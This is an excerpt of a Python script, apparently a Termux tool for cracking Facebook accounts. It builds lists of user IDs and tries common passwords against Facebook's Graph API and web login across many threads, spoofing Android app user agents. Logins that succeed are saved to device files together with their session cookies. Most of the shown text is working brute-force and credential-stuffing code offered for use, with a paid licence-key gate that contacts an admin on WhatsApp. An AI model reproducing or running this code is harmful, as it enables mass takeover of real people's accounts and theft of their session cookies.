...
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FBAV;FBAV/320.0.0.45.119;FBBV/21000000;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Verizon;FBMF/Samsung;FBBD/samsung;FBDV/SM-G991B;FBSN/Android;FBSV/11;FBOP/5]"
    

logo ="""                                                                        

\x1b[1;97m _______  _______  _       _________
\x1b[1;97m(  ____ \(  ___  )( (    /|\__   __/
\x1b[1;96m| (    \/| (   ) ||  \  ( |   ) (   
\x1b[1;91m| (_____ | (___) ||   \ | |   | |   
\x1b[1;91m(_____  )|  ___  || (\ \) |   | |   
\x1b[1;96m      ) || (   ) || | \   |   | |   
\x1b[1;97m/\____) || )   ( || )  \  |___) (___
\x1b[1;97m\_______)|/     \||/    )_)\_______/
                                    
                               \33[1;97mHasnain Error                                     
\33[1;95m-----------------------------------------------------
\033[1;96m Owner  : Error 
\033[1;96m GitHub : who kya hota hai 
\033[1;96m Version:\033[1;92m 2.6 \033[1;92m:/
\033[1;96m Status : Personal :/
\033[1;92m Notice : Use aroplane mod after 3 mint  :/
\033[1;95m--------------------------------------------------"""
def linex():
	print('\033[1;95m--------------------------------------------------')
def clear():
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=40) as SYCO:	
			linex()
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
				if mthd in ['1','01']:
					SYCO.submit(SYCO1,ids,passlist)
				if mthd in ['2','02']:
					SYCO.submit(SYCO2,ids,passlist)
				if mthd in ['3','03']:
					SYCO.submit(SYCO3,ids,passlist)
				if mthd in ['4','04']:
					SYCO.submit(SYCO4,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
	...
	clear()
	print('\033[1;37m example: SYCO, ali, sajjad, faizan\033[1;37m')
	linex()
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SANI-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/279.0.0.43.120;FBDM/{density=2.5,width=1440,height=1920};FBLC/en_US;FBCR/Verizon;FBMF/infinix;FBBD/infinix;FBDV/Smart 8;FBCA/armeabi-v7a;FBBR/Barki;]"
...
'sig':'4c854da0db9429f4913c2a1b221c1d30'}
    ...
    'viewport-width': '980',}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SANI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/SANI-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/SANI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SANI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m\r\r [SANI-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                pass
  #method3            graph method

def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SANI-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/415.0.0.29.120;FBDM/{density=2.5,width=1440,height=1280};FBLC/en_GB;FBCR/T-Mobile;FBMF/infinix;FBBD/infinix;FBDV/Hot 10;FBCA/armeabi-v7a;FBBR/Barki;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SANI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerSYCO = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SYCOramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SYCOramxan};{powerSYCO}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SANI-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/SANI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SANI-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/415.0.0.29.120;FBDM/{density=3.0,width=720,height=2400};FBLC/en_US;FBCR/Verizon;FBMF/infinix;FBBD/infinix;FBDV/Hot 30 Play NFC;FBCA/arm64-v8a;FBBR/Barki;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def api4(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [SANI-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [SANI-CP] '+ids+' | '+pas)
				open('/sdcard/SANI-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [SANI-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/SANI-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/SANI-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def SYCO1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [SANI] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
    ...
    'dpr': '2',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="24", "Chromium";v="116"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="24.0.0.0", "Chromium";v="116.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Infinix X659B"',
    'sec-ch-ua-platform': '"Android"',
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [SANI-OK] '+uid+' | '+pas+'\033[1;37m')
				print(cok)
				oks.append(uid)
				open('/sdcard/SANI-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
			elif "www.facebook.com" in str(response.headers.get('Location')):
				try:
					print('\r\r\033[1;32m [SANI-CP] '+uid+' | '+pas+'\033[1;37m')
					x = str(response.headers)
					ids = re.findall("3A(.*?)%2",str(x))[1]
				except:
					ids = ids
				print('\r\r\033[1;32m [SANI-OK] '+uid+' | '+pas+'\033[1;37m')
				open('/sdcard/SANI-R-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:continue
		except (requests.exceptions.ConnectionError):
...
def approval():
	...
	key = "SYCO-"+plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '').replace("SMPP","").replace("YT","")
	global key1
	try:
		...
		print(" 15-Days Price   : 0 PKR")
		print(" 1-Month Price   : 0 PKR")
		print(" Other Countries : 0$ for Weekly  ")
		print(" Other Countries : 0$ for 15 days ")
		print(" Other Countries : 0$ For Monthly")
		input('\033[1;37m Press Enter For Contact To Admin ')
		subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+9203359393855&text=Hello My land Sir ! Please Approve My Key The LaNd Key Is : "+ key+'|'+key1])
		time.sleep(0)
		approval()
